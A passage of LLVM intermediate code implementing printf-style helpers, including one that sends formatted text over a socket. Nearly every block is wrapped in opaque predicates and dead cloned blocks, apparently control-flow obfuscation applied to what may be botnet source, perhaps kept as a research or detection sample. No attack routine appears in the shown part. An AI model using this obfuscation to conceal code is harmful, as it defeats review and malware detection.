  br i1 %64, label %originalBB7, label %originalBB7alteredBB

originalBB7:                                      ; preds = %originalBB7alteredBB, %56
  %65 = load i8*, i8** %12, align 8
  %66 = getelementptr inbounds i8, i8* %65, i32 1
  store i8* %66, i8** %12, align 8
  %67 = load i32, i32* @x.9
  %68 = load i32, i32* @y.10
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBBpart29, label %originalBB7alteredBB

originalBBpart29:                                 ; preds = %originalBB7
  br label %33

; <label>:75:                                     ; preds = %33
  %76 = load i32, i32* %11, align 4
  %77 = load i32, i32* %7, align 4
  %78 = icmp sge i32 %76, %77
  br i1 %78, label %79, label %80

; <label>:79:                                     ; preds = %75
  store i32 0, i32* %7, align 4
  br label %84

; <label>:80:                                     ; preds = %75
  %81 = load i32, i32* %11, align 4
  %82 = load i32, i32* %7, align 4
  %83 = sub nsw i32 %82, %81
  store i32 %83, i32* %7, align 4
  br label %84

; <label>:84:                                     ; preds = %80, %79
  %85 = load i32, i32* @x.9
  %86 = load i32, i32* @y.10
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBB11, label %originalBB11alteredBB

originalBB11:                                     ; preds = %originalBB11alteredBB, %84
  %93 = load i32, i32* %8, align 4
  %94 = and i32 %93, 2
  %95 = icmp ne i32 %94, 0
  %96 = load i32, i32* @x.9
  %97 = load i32, i32* @y.10
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBBpart214, label %originalBB11alteredBB

originalBBpart214:                                ; preds = %originalBB11
  br i1 %95, label %104, label %121

; <label>:104:                                    ; preds = %originalBBpart214
  %105 = load i32, i32* @x.9
  %106 = load i32, i32* @y.10
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBB16, label %originalBB16alteredBB

originalBB16:                                     ; preds = %originalBB16alteredBB, %104
  store i32 48, i32* %10, align 4
  %113 = load i32, i32* @x.9
  %114 = load i32, i32* @y.10
  %115 = sub i32 %113, 1
  %116 = mul i32 %113, %115
  %117 = urem i32 %116, 2
  %118 = icmp eq i32 %117, 0
  %119 = icmp slt i32 %114, 10
  %120 = or i1 %118, %119
  br i1 %120, label %originalBBpart218, label %originalBB16alteredBB

originalBBpart218:                                ; preds = %originalBB16
  br label %121

; <label>:121:                                    ; preds = %originalBBpart218, %originalBBpart214
  br label %122

; <label>:122:                                    ; preds = %121, %4
  %123 = load i32, i32* @x.9
  %124 = load i32, i32* @y.10
  %125 = sub i32 %123, 1
  %126 = mul i32 %123, %125
  %127 = urem i32 %126, 2
  %128 = icmp eq i32 %127, 0
  %129 = icmp slt i32 %124, 10
  %130 = or i1 %128, %129
  br i1 %130, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %122
  %131 = load i32, i32* %8, align 4
  %132 = and i32 %131, 1
  %133 = icmp ne i32 %132, 0
  %134 = load i32, i32* @x.9
  %135 = load i32, i32* @y.10
  %136 = sub i32 %134, 1
  %137 = mul i32 %134, %136
  %138 = urem i32 %137, 2
  %139 = icmp eq i32 %138, 0
  %140 = icmp slt i32 %135, 10
  %141 = or i1 %139, %140
  br i1 %141, label %originalBBpart228, label %originalBB20alteredBB

originalBBpart228:                                ; preds = %originalBB20
  br i1 %133, label %171, label %142

; <label>:142:                                    ; preds = %originalBBpart228
  br label %143

; <label>:143:                                    ; preds = %167, %142
  %144 = load i32, i32* @x.9
  %145 = load i32, i32* @y.10
  %146 = sub i32 %144, 1
  %147 = mul i32 %144, %146
  %148 = urem i32 %147, 2
  %149 = icmp eq i32 %148, 0
  %150 = icmp slt i32 %145, 10
  %151 = or i1 %149, %150
  br i1 %151, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %143
  %152 = load i32, i32* %7, align 4
  %153 = icmp sgt i32 %152, 0
  %154 = load i32, i32* @x.9
  %155 = load i32, i32* @y.10
  %156 = sub i32 %154, 1
  %157 = mul i32 %154, %156
  %158 = urem i32 %157, 2
  %159 = icmp eq i32 %158, 0
  %160 = icmp slt i32 %155, 10
  %161 = or i1 %159, %160
  br i1 %161, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %153, label %162, label %170

; <label>:162:                                    ; preds = %originalBBpart232
  %163 = load i8**, i8*** %5, align 8
  %164 = load i32, i32* %10, align 4
  call void @printchar(i8** %163, i32 %164)
  %165 = load i32, i32* %9, align 4
  %166 = add nsw i32 %165, 1
  store i32 %166, i32* %9, align 4
  br label %167

; <label>:167:                                    ; preds = %162
  %168 = load i32, i32* %7, align 4
  %169 = add nsw i32 %168, -1
  store i32 %169, i32* %7, align 4
  br label %143

; <label>:170:                                    ; preds = %originalBBpart232
  br label %171

; <label>:171:                                    ; preds = %170, %originalBBpart228
  %172 = load i32, i32* @x.9
  %173 = load i32, i32* @y.10
  %174 = sub i32 %172, 1
  %175 = mul i32 %172, %174
  %176 = urem i32 %175, 2
  %177 = icmp eq i32 %176, 0
  %178 = icmp slt i32 %173, 10
  %179 = or i1 %177, %178
  br i1 %179, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %171
  %180 = load i32, i32* @x.9
  %181 = load i32, i32* @y.10
  %182 = sub i32 %180, 1
  %183 = mul i32 %180, %182
  %184 = urem i32 %183, 2
  %185 = icmp eq i32 %184, 0
  %186 = icmp slt i32 %181, 10
  %187 = or i1 %185, %186
  br i1 %187, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br label %188

; <label>:188:                                    ; preds = %199, %originalBBpart236
  %189 = load i8*, i8** %6, align 8
  %190 = load i8, i8* %189, align 1
  %191 = icmp ne i8 %190, 0
  br i1 %191, label %192, label %202

; <label>:192:                                    ; preds = %188
  %193 = load i8**, i8*** %5, align 8
  %194 = load i8*, i8** %6, align 8
  %195 = load i8, i8* %194, align 1
  %196 = zext i8 %195 to i32
  call void @printchar(i8** %193, i32 %196)
  %197 = load i32, i32* %9, align 4
  %198 = add nsw i32 %197, 1
  store i32 %198, i32* %9, align 4
  br label %199

; <label>:199:                                    ; preds = %192
  %200 = load i8*, i8** %6, align 8
  %201 = getelementptr inbounds i8, i8* %200, i32 1
  store i8* %201, i8** %6, align 8
  br label %188

; <label>:202:                                    ; preds = %188
  br label %203

; <label>:203:                                    ; preds = %originalBBpart252, %202
  %204 = load i32, i32* @x.9
  %205 = load i32, i32* @y.10
  %206 = sub i32 %204, 1
  %207 = mul i32 %204, %206
  %208 = urem i32 %207, 2
  %209 = icmp eq i32 %208, 0
  %210 = icmp slt i32 %205, 10
  %211 = or i1 %209, %210
  br i1 %211, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %203
  %212 = load i32, i32* %7, align 4
  %213 = icmp sgt i32 %212, 0
  %214 = load i32, i32* @x.9
  %215 = load i32, i32* @y.10
  %216 = sub i32 %214, 1
  %217 = mul i32 %214, %216
  %218 = urem i32 %217, 2
  %219 = icmp eq i32 %218, 0
  %220 = icmp slt i32 %215, 10
  %221 = or i1 %219, %220
  br i1 %221, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br i1 %213, label %222, label %246

; <label>:222:                                    ; preds = %originalBBpart240
  %223 = load i8**, i8*** %5, align 8
  %224 = load i32, i32* %10, align 4
  call void @printchar(i8** %223, i32 %224)
  %225 = load i32, i32* %9, align 4
  %226 = add nsw i32 %225, 1
  store i32 %226, i32* %9, align 4
  br label %227

; <label>:227:                                    ; preds = %222
  %228 = load i32, i32* @x.9
  %229 = load i32, i32* @y.10
  %230 = sub i32 %228, 1
  %231 = mul i32 %228, %230
  %232 = urem i32 %231, 2
  %233 = icmp eq i32 %232, 0
  %234 = icmp slt i32 %229, 10
  %235 = or i1 %233, %234
  br i1 %235, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %227
  %236 = load i32, i32* %7, align 4
  %237 = add nsw i32 %236, -1
  store i32 %237, i32* %7, align 4
  %238 = load i32, i32* @x.9
  %239 = load i32, i32* @y.10
  %240 = sub i32 %238, 1
  %241 = mul i32 %238, %240
  %242 = urem i32 %241, 2
  %243 = icmp eq i32 %242, 0
  %244 = icmp slt i32 %239, 10
  %245 = or i1 %243, %244
  br i1 %245, label %originalBBpart252, label %originalBB42alteredBB

originalBBpart252:                                ; preds = %originalBB42
  br label %203

; <label>:246:                                    ; preds = %originalBBpart240
  %247 = load i32, i32* %9, align 4
  ret i32 %247

originalBBalteredBB:                              ; preds = %originalBB, %15
  store i32 0, i32* %11, align 4
  %248 = load i8*, i8** %6, align 8
  store i8* %248, i8** %12, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %37
  %249 = load i32, i32* %11, align 4
  %_ = shl i32 %249, 1
  %_2 = shl i32 %249, 1
  %_3 = shl i32 %249, 1
  %250 = add nsw i32 %249, 1
  store i32 %250, i32* %11, align 4
  br label %originalBB1

originalBB7alteredBB:                             ; preds = %originalBB7, %56
  %251 = load i8*, i8** %12, align 8
  %252 = getelementptr inbounds i8, i8* %251, i32 1
  store i8* %252, i8** %12, align 8
  br label %originalBB7

originalBB11alteredBB:                            ; preds = %originalBB11, %84
  %253 = load i32, i32* %8, align 4
  %_12 = shl i32 %253, 2
  %254 = and i32 %253, 2
  %255 = icmp ne i32 %254, 0
  br label %originalBB11

originalBB16alteredBB:                            ; preds = %originalBB16, %104
  store i32 48, i32* %10, align 4
  br label %originalBB16

originalBB20alteredBB:                            ; preds = %originalBB20, %122
  %256 = load i32, i32* %8, align 4
  %_21 = sub i32 0, %256
  %gen = add i32 %_21, 1
  %_22 = sub i32 %256, 1
  %gen23 = mul i32 %_22, 1
  %_24 = sub i32 %256, 1
  %gen25 = mul i32 %_24, 1
  %257 = and i32 %256, 1
  %258 = icmp ne i32 %257, 0
  br label %originalBB20

originalBB30alteredBB:                            ; preds = %originalBB30, %143
  %259 = load i32, i32* %7, align 4
  %260 = icmp sgt i32 %259, 0
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %171
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %203
  %261 = load i32, i32* %7, align 4
  %262 = icmp sgt i32 %261, 0
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %227
  %263 = load i32, i32* %7, align 4
  %_43 = sub i32 %263, -1
  %gen44 = mul i32 %_43, -1
  %_45 = shl i32 %263, -1
  %_46 = shl i32 %263, -1
  %_47 = sub i32 %263, -1
  %gen48 = mul i32 %_47, -1
  %_49 = sub i32 %263, -1
  %gen50 = mul i32 %_49, -1
  %264 = add nsw i32 %263, -1
  store i32 %264, i32* %7, align 4
  br label %originalBB42
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

; <label>:25:                                     ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %198

; <label>:33:                                     ; preds = %7
  %34 = load i32, i32* @x.11
  %35 = load i32, i32* @y.12
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %33
  %42 = load i32, i32* %12, align 4
  %43 = icmp ne i32 %42, 0
  %44 = load i32, i32* @x.11
  %45 = load i32, i32* @y.12
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %43, label %52, label %77

; <label>:52:                                     ; preds = %originalBBpart2
  %53 = load i32, i32* %11, align 4
  %54 = icmp eq i32 %53, 10
  br i1 %54, label %55, label %77

; <label>:55:                                     ; preds = %52
  %56 = load i32, i32* @x.11
  %57 = load i32, i32* @y.12
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %55
  %64 = load i32, i32* %10, align 4
  %65 = icmp slt i32 %64, 0
  %66 = load i32, i32* @x.11
  %67 = load i32, i32* @y.12
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %65, label %74, label %77

; <label>:74:                                     ; preds = %originalBBpart24
  store i32 1, i32* %19, align 4
  %75 = load i32, i32* %10, align 4
  %76 = sub nsw i32 0, %75
  store i32 %76, i32* %21, align 4
  br label %77

; <label>:77:                                     ; preds = %74, %originalBBpart24, %52, %originalBBpart2
  %78 = load i32, i32* @x.11
  %79 = load i32, i32* @y.12
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %77
  %86 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %87 = getelementptr inbounds i8, i8* %86, i64 12
  %88 = getelementptr inbounds i8, i8* %87, i64 -1
  store i8* %88, i8** %17, align 8
  %89 = load i8*, i8** %17, align 8
  store i8 0, i8* %89, align 1
  %90 = load i32, i32* @x.11
  %91 = load i32, i32* @y.12
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %98

; <label>:98:                                     ; preds = %145, %originalBBpart28
  %99 = load i32, i32* %21, align 4
  %100 = icmp ne i32 %99, 0
  br i1 %100, label %101, label %154

; <label>:101:                                    ; preds = %98
  %102 = load i32, i32* @x.11
  %103 = load i32, i32* @y.12
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %101
  %110 = load i32, i32* %21, align 4
  %111 = load i32, i32* %11, align 4
  %112 = urem i32 %110, %111
  store i32 %112, i32* %18, align 4
  %113 = load i32, i32* %18, align 4
  %114 = icmp sge i32 %113, 10
  %115 = load i32, i32* @x.11
  %116 = load i32, i32* @y.12
  %117 = sub i32 %115, 1
  %118 = mul i32 %115, %117
  %119 = urem i32 %118, 2
  %120 = icmp eq i32 %119, 0
  %121 = icmp slt i32 %116, 10
  %122 = or i1 %120, %121
  br i1 %122, label %originalBBpart213, label %originalBB10alteredBB

originalBBpart213:                                ; preds = %originalBB10
  br i1 %114, label %123, label %145

; <label>:123:                                    ; preds = %originalBBpart213
  %124 = load i32, i32* @x.11
  %125 = load i32, i32* @y.12
  %126 = sub i32 %124, 1
  %127 = mul i32 %124, %126
  %128 = urem i32 %127, 2
  %129 = icmp eq i32 %128, 0
  %130 = icmp slt i32 %125, 10
  %131 = or i1 %129, %130
  br i1 %131, label %originalBB15, label %originalBB15alteredBB

originalBB15:                                     ; preds = %originalBB15alteredBB, %123
  %132 = load i32, i32* %15, align 4
  %133 = sub nsw i32 %132, 48
  %134 = sub nsw i32 %133, 10
  %135 = load i32, i32* %18, align 4
  %136 = add nsw i32 %135, %134
  store i32 %136, i32* %18, align 4
  %137 = load i32, i32* @x.11
  %138 = load i32, i32* @y.12
  %139 = sub i32 %137, 1
  %140 = mul i32 %137, %139
  %141 = urem i32 %140, 2
  %142 = icmp eq i32 %141, 0
  %143 = icmp slt i32 %138, 10
  %144 = or i1 %142, %143
  br i1 %144, label %originalBBpart238, label %originalBB15alteredBB

originalBBpart238:                                ; preds = %originalBB15
  br label %145

; <label>:145:                                    ; preds = %originalBBpart238, %originalBBpart213
  %146 = load i32, i32* %18, align 4
  %147 = add nsw i32 %146, 48
  %148 = trunc i32 %147 to i8
  %149 = load i8*, i8** %17, align 8
  %150 = getelementptr inbounds i8, i8* %149, i32 -1
  store i8* %150, i8** %17, align 8
  store i8 %148, i8* %150, align 1
  %151 = load i32, i32* %11, align 4
  %152 = load i32, i32* %21, align 4
  %153 = udiv i32 %152, %151
  store i32 %153, i32* %21, align 4
  br label %98

; <label>:154:                                    ; preds = %98
  %155 = load i32, i32* @x.11
  %156 = load i32, i32* @y.12
  %157 = sub i32 %155, 1
  %158 = mul i32 %155, %157
  %159 = urem i32 %158, 2
  %160 = icmp eq i32 %159, 0
  %161 = icmp slt i32 %156, 10
  %162 = or i1 %160, %161
  br i1 %162, label %originalBB40, label %originalBB40alteredBB

originalBB40:                                     ; preds = %originalBB40alteredBB, %154
  %163 = load i32, i32* %19, align 4
  %164 = icmp ne i32 %163, 0
  %165 = load i32, i32* @x.11
  %166 = load i32, i32* @y.12
  %167 = sub i32 %165, 1
  %168 = mul i32 %165, %167
  %169 = urem i32 %168, 2
  %170 = icmp eq i32 %169, 0
  %171 = icmp slt i32 %166, 10
  %172 = or i1 %170, %171
  br i1 %172, label %originalBBpart242, label %originalBB40alteredBB

originalBBpart242:                                ; preds = %originalBB40
  br i1 %164, label %173, label %190

; <label>:173:                                    ; preds = %originalBBpart242
  %174 = load i32, i32* %13, align 4
  %175 = icmp ne i32 %174, 0
  br i1 %175, label %176, label %186

; <label>:176:                                    ; preds = %173
  %177 = load i32, i32* %14, align 4
  %178 = and i32 %177, 2
  %179 = icmp ne i32 %178, 0
  br i1 %179, label %180, label %186

; <label>:180:                                    ; preds = %176
  %181 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %181, i32 45)
  %182 = load i32, i32* %20, align 4
  %183 = add nsw i32 %182, 1
  store i32 %183, i32* %20, align 4
  %184 = load i32, i32* %13, align 4
  %185 = add nsw i32 %184, -1
  store i32 %185, i32* %13, align 4
  br label %189

; <label>:186:                                    ; preds = %176, %173
  %187 = load i8*, i8** %17, align 8
  %188 = getelementptr inbounds i8, i8* %187, i32 -1
  store i8* %188, i8** %17, align 8
  store i8 45, i8* %188, align 1
  br label %189

; <label>:189:                                    ; preds = %186, %180
  br label %190

; <label>:190:                                    ; preds = %189, %originalBBpart242
  %191 = load i32, i32* %20, align 4
  %192 = load i8**, i8*** %9, align 8
  %193 = load i8*, i8** %17, align 8
  %194 = load i32, i32* %13, align 4
  %195 = load i32, i32* %14, align 4
  %196 = call i32 @prints(i8** %192, i8* %193, i32 %194, i32 %195)
  %197 = add nsw i32 %191, %196
  store i32 %197, i32* %8, align 4
  br label %198

; <label>:198:                                    ; preds = %190, %25
  %199 = load i32, i32* %8, align 4
  ret i32 %199

originalBBalteredBB:                              ; preds = %originalBB, %33
  %200 = load i32, i32* %12, align 4
  %201 = icmp ne i32 %200, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %55
  %202 = load i32, i32* %10, align 4
  %203 = icmp slt i32 %202, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %77
  %204 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %205 = getelementptr inbounds i8, i8* %204, i64 12
  %206 = getelementptr inbounds i8, i8* %205, i64 -1
  store i8* %206, i8** %17, align 8
  %207 = load i8*, i8** %17, align 8
  store i8 0, i8* %207, align 1
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %101
  %208 = load i32, i32* %21, align 4
  %209 = load i32, i32* %11, align 4
  %_ = sub i32 %208, %209
  %gen = mul i32 %_, %209
  %_11 = shl i32 %208, %209
  %210 = urem i32 %208, %209
  store i32 %210, i32* %18, align 4
  %211 = load i32, i32* %18, align 4
  %212 = icmp sge i32 %211, 10
  br label %originalBB10

originalBB15alteredBB:                            ; preds = %originalBB15, %123
  %213 = load i32, i32* %15, align 4
  %_16 = shl i32 %213, 48
  %_17 = sub i32 0, %213
  %gen18 = add i32 %_17, 48
  %214 = sub nsw i32 %213, 48
  %_19 = shl i32 %214, 10
  %_20 = sub i32 0, %214
  %gen21 = add i32 %_20, 10
  %_22 = sub i32 %214, 10
  %gen23 = mul i32 %_22, 10
  %_24 = sub i32 0, %214
  %gen25 = add i32 %_24, 10
  %_26 = sub i32 %214, 10
  %gen27 = mul i32 %_26, 10
  %215 = sub nsw i32 %214, 10
  %216 = load i32, i32* %18, align 4
  %_28 = sub i32 0, %216
  %gen29 = add i32 %_28, %215
  %_30 = sub i32 %216, %215
  %gen31 = mul i32 %_30, %215
  %_32 = sub i32 0, %216
  %gen33 = add i32 %_32, %215
  %_34 = shl i32 %216, %215
  %_35 = sub i32 0, %216
  %gen36 = add i32 %_35, %215
  %217 = add nsw i32 %216, %215
  store i32 %217, i32* %18, align 4
  br label %originalBB15

originalBB40alteredBB:                            ; preds = %originalBB40, %154
  %218 = load i32, i32* %19, align 4
  %219 = icmp ne i32 %218, 0
  br label %originalBB40
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = load i32, i32* @x.13
  %4 = load i32, i32* @y.14
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8**, align 8
  %12 = alloca i32, align 4
  store i8** %0, i8*** %11, align 8
  store i32 %1, i32* %12, align 4
  %13 = load i8**, i8*** %11, align 8
  %14 = icmp ne i8** %13, null
  %15 = load i32, i32* @x.13
  %16 = load i32, i32* @y.14
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %14, label %23, label %31

; <label>:23:                                     ; preds = %originalBBpart2
  %24 = load i32, i32* %12, align 4
  %25 = trunc i32 %24 to i8
  %26 = load i8**, i8*** %11, align 8
  %27 = load i8*, i8** %26, align 8
  store i8 %25, i8* %27, align 1
  %28 = load i8**, i8*** %11, align 8
  %29 = load i8*, i8** %28, align 8
  %30 = getelementptr inbounds i8, i8* %29, i32 1
  store i8* %30, i8** %28, align 8
  br label %34

; <label>:31:                                     ; preds = %originalBBpart2
  %32 = bitcast i32* %12 to i8*
  %33 = call i64 @write(i32 1, i8* %32, i64 1)
  br label %34

; <label>:34:                                     ; preds = %31, %23
  %35 = load i32, i32* @x.13
  %36 = load i32, i32* @y.14
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %34
  %43 = load i32, i32* @x.13
  %44 = load i32, i32* @y.14
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %51 = alloca i8**, align 8
  %52 = alloca i32, align 4
  store i8** %0, i8*** %51, align 8
  store i32 %1, i32* %52, align 4
  %53 = load i8**, i8*** %51, align 8
  %54 = icmp ne i8** %53, null
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %34
  br label %originalBB1
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #2

declare i64 @write(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #2
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #10
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i32, i32* %3, align 4
  %24 = load i8*, i8** %6, align 8
  %25 = load i8*, i8** %6, align 8
  %26 = call i64 @strlen(i8* %25) #10
  %27 = call i64 @send(i32 %23, i8* %24, i64 %26, i32 16384)
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* %8, align 4
  %29 = load i8*, i8** %6, align 8
  call void @free(i8* %29) #2
  %30 = load i32, i32* %8, align 4
  ret i32 %30
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: nounwind
declare void @free(i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8*) #0 {
  %3 = alloca i32, align 4
